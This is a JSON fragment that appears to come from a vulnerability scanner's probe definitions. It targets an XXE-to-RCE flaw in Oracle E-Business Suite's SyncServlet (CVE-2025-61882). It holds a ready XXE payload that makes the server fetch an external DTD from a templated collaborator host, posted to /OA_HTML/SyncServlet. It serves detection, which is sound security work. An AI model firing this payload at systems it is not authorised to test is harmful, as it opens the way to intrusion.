  "contexts": {
    "oracle_ebs_xxe_rce_2025": {
      "description": "Oracle E-Business Suite SyncServlet XXE → RCE (CVE-2025-61882). AWVS v25.11.3.",
      "tech_match": [
        "oracle ebs",
        "OA_HTML"
      ],
      "param_match": [],
      "probes": [
        {
          "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % rce SYSTEM \"http://{{collaborator}}/xxe.dtd\"> %rce;]><r/>",
          "description": "Submit XXE payload to /OA_HTML/SyncServlet — confirms parser fetches external entity",
          "matchers": [
            {
              "type": "collaborator",
              "interaction": "dns"
            }
          ],
          "severity": "critical",
          "confidence_boost": 90,
          "variables": {
            "path_override": "/OA_HTML/SyncServlet",
            "method": "POST",
            "content_type": "text/xml",
            "manual_chain": true
          }
        }
      ]
    },
